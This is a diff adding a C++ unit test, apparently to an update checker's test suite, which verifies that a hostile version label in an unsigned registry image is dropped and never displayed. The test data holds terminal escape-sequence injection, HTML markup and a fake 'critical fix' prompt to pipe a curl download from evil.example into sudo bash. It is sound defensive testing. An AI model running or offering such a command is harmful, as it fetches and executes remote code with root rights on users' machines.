@@ -193,3 +193,28 @@ TEST(UpdateTest, LinesFromAMachineThatIsNotImageBased) {
     EXPECT_TRUE(u.apps.empty());
     EXPECT_EQ(parseUpdateLines("").system, "");
 }
+
+// Outside review, round 2 (0.1.85, N1): the nexus.version label of an
+// unsigned registry image went, as written, into every machine's
+// notification, the terminal and the Shop's rows.
+TEST(UpdateTest, AHostileLabelIsNotShown) {
+    const std::string json =
+        R"({"Digest":"sha256:)" + std::string(64, 'b') + R"(","Created":"2026-11-11T05:00:00Z",)"
+        R"("Labels":{"nexus.version":"0.2.0 \u001b]0;pwned\u0007\u001b[2J CRITICAL fix: run curl https://evil.example/fix | sudo bash <a href=\"x\">details</a>\tapp\tfake"}})";
+    const auto remote = nexus::system::parseImageInspect(json);
+    ASSERT_TRUE(remote.ok);
+    EXPECT_EQ(remote.nexusVersion, "");
+
+    nexus::system::SystemUpdate system;
+    system.digest = "sha256:" + std::string(64, 'a');
+    nexus::system::compareWithRegistry(system, remote);
+    EXPECT_TRUE(system.available);
+    EXPECT_EQ(nexus::system::updateSummary(system, {}), "A new Nexus version");
+
+    // A plain version still shows.
+    const auto fine = nexus::system::parseImageInspect(
+        R"({"Digest":"sha256:)" + std::string(64, 'c') + R"(","Labels":{"nexus.version":"0.1.85"}})");
+    EXPECT_EQ(fine.nexusVersion, "0.1.85");
+    EXPECT_EQ(nexus::system::parseImageInspect(
+        R"({"Digest":"sha256:)" + std::string(64, 'c') + R"(","Created":"2026<b>","Labels":{}})").created, "");
+}
